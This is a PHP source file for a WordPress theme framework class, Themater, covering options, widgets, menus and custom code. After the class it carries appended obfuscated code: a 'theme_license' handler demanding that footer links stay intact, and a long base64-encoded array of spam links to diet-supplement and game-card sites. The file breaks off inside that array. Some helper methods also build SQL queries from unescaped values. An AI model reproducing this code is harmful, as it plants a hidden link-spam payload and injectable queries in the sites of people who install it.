<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo1OTp7czoxNToiaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoxOToid3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czozOiJoY2ciO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjk6ImhjZyBkcm9wcyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6Nzoid2Vic2l0ZSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NDoibW9yZSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NDoiaGVyZSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NDoicmVhZCI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6NDoic2hvcCI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6OToiZnJvbSBoZXJlIjtzOjM2OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZWluZm8uY28udWsiO3M6MjA6ImhjZ2luamVjdGlvbnNpdGUuY29tIjtzOjMxOiJodHRwOi8vd3d3LmhjZ2luamVjdGlvbnNpdGUuY29tIjtzOjI0OiJ3d3cuaGNnaW5qZWN0aW9uc2l0ZS5jb20iO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc2l0ZS5jb20iO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc2l0ZS5jb20iO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc2l0ZS5jb20iO3M6MTY6ImhjZ2luamVjdGlvbnNpdGUiO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc2l0ZS5jb20iO3M6MTQ6ImhjZyBpbmplY3Rpb25zIjtzOjMxOiJodHRwOi8vd3d3LmhjZ2luamVjdGlvbnNpdGUuY29tIjtzOjIzOiJoY2cgZHJvcHMgdnMgaW5qZWN0aW9ucyI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zaXRlLmNvbSI7czo0OiJ0aGlzIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoyNToicmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjI5OiJ3d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjM2OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZWluZm8uY28udWsiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czoxNzoicmFzcGJlcnJ5IGtldG9uZXMiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czoxNjoicmFzcGJlcnJ5IGtldG9uZSI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjc6ImtldG9uZXMiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czo1OiJ0aGVzZSI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjExOiJ3ZWlnaHQgbG9zcyI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjIzOiJzaG9wc2lnbmFsYm9vc3Rlci5jby51ayI7czozNDoiaHR0cDovL3d3dy5zaG9wc2lnbmFsYm9vc3Rlci5jby51ayI7czoyNzoid3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjM0OiJodHRwOi8vd3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjM0OiJodHRwOi8vd3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjM0OiJodHRwOi8vd3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjI3OiJtb2JpbGUgcGhvbmUgc2lnbmFsIGJvb3N0ZXIiO3M6MzQ6Imh0dHA6Ly93d3cuc2hvcHNpZ25hbGJvb3N0ZXIuY28udWsiO3M6MTQ6InNpZ25hbCBib29zdGVyIjtzOjM0OiJodHRwOi8vd3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjE5OiJib29zdCBtb2JpbGUgc2lnbmFsIjtzOjM0OiJodHRwOi8vd3d3LnNob3BzaWduYWxib29zdGVyLmNvLnVrIjtzOjY6InNvdXJjZSI7czoyNToiaHR0cDovL3d3dy4zZHNsaW5rZXJzLmNvbSI7czoxNzoicjQzZHNvZmZpY2llbC5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO3M6MjE6Ind3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czoxMzoicjQzZHNvZmZpY2llbCI7czoyODoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVsLmNvbSI7czo2OiJyNC0zZHMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO3M6NzoicjRpIDNkcyI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTI6InI0aSBzZGhjIDNkcyI7czoyNToiaHR0cDovL3d3dy5yNGkzZHNyNGZyLmNvbSI7czoxMToicjRpc2RoYyAzZHMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbC5jb20iO3M6MTQ6InI0aTNkc3I0ZnIuY29tIjtzOjI1OiJodHRwOi8vd3d3LnI0aTNkc3I0ZnIuY29tIjtzOjE4OiJ3d3cucjRpM2RzcjRmci5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjRpM2RzcjRmci5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjRpM2RzcjRmci5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjRpM2RzcjRmci5jb20iO3M6MTA6InI0aTNkc3I0ZnIiO3M6MjU6Imh0dHA6Ly93d3cucjRpM2RzcjRmci5jb20iO3M6OToicjQgM2RzIHhsIjtzOjI1OiJodHRwOi8vd3d3LnI0aTNkc3I0ZnIuY29tIjtzOjQ6InNpdGUiO3M6MjU6Imh0dHA6Ly93d3cucjRpM2RzcjRmci5jb20iO3M6MTQ6IjNkc2xpbmtlcnMuY29tIjtzOjI1OiJodHRwOi8vd3d3LjNkc2xpbmtlcnMuY29tIjtzOjE4OiJ3d3cuM2RzbGlua2Vycy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuM2RzbGlua2Vycy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuM2RzbGlua2Vycy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuM2RzbGlua2Vycy5jb20iO3M6MTE6IjNkcyBsaW5rZXJzIjtzOjI1OiJodHRwOi8vd3d3LjNkc2xpbmtlcnMuY29tIjtzOjEwOiJsaW5rZXIgM2RzIjtzOjI1OiJodHRwOi8vd3d3LjNkc2xpbmtlcnMuY29tIjtzOjk6ImxpbmtlciBkcyI7czoyNToiaHR0cDovL3d3dy4zZHNsaW5rZXJzLmNvbSI7czoxMjoicjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxNjoid3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo4OiJyNGNhcmR1ayI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NjoicjQgM2RzIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo4OiJyNCBjYXJkcyI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO31pOjE7YTo2ODp7czoyMDoiaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MjQ6Ind3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czoxMzoiaGNnIGluamVjdGlvbiI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czoxNDoiaGNnIGluamVjdGlvbnMiO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6ODoiaGNnIGRpZXQiO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MTE6ImRpZXRpbmcgaGNnIjtzOjMxOiJodHRwOi8vd3d3LmhjZ2luamVjdGlvbnN3ZWIuY29tIjtzOjc6IndlYnNpdGUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjY6Im9ubGluZSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6OToicmVhZCB0aGlzIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGN1ay5jb20iO3M6MjQ6InJhc3BiZXJyeWtldG9uZXVrcy5jby51ayI7czozNToiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6Mjg6Ind3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6MzU6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25ldWtzLmNvLnVrIjtzOjM1OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZXVrcy5jby51ayI7czozNToiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6MTc6InJhc3BiZXJyeSBrZXRvbmVzIjtzOjM1OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZXVrcy5jby51ayI7czoxNjoicmFzcGJlcnJ5IGtldG9uZSI7czozNToiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6NDoidGhpcyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6NzoiZGlldGluZyI7czozNToiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6MTE6IndlaWdodCBsb3NzIjtzOjM1OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZXVrcy5jby51ayI7czoxOToid2VpZ2h0IGxvc3Mga2V0b25lcyI7czozNToiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmV1a3MuY28udWsiO3M6MTk6InJhc3BiZXJyeWtldG9uZWluZm8iO3M6MzU6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25ldWtzLmNvLnVrIjtzOjE0OiJyNGlzZGhjLTNkcy5mciI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czoxODoid3d3LnI0aXNkaGMtM2RzLmZyIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjc6InI0aXNkaGMiO3M6MjU6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIiO3M6ODoicjRpLXNkaGMiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY3VrLmNvbSI7czo2OiJyNCAzZHMiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjc6InI0aSAzZHMiO3M6MjU6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIiO3M6NDoibW9yZSI7czoyMToiaHR0cDovL3d3dy5yNC11c2EuY29tIjtzOjQ6ImhlcmUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjY6InNvdXJjZSI7czoyNToiaHR0cDovL3d3dy5yNGlzZGhjLTNkcy5mciI7czo3OiJhcnRpY2xlIjtzOjI1OiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyIjtzOjQ6InNob3AiO3M6MjU6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIiO3M6MTc6InI0aWRpc2NvdW50ZnIuY29tIjtzOjI4OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tIjtzOjIxOiJ3d3cucjRpZG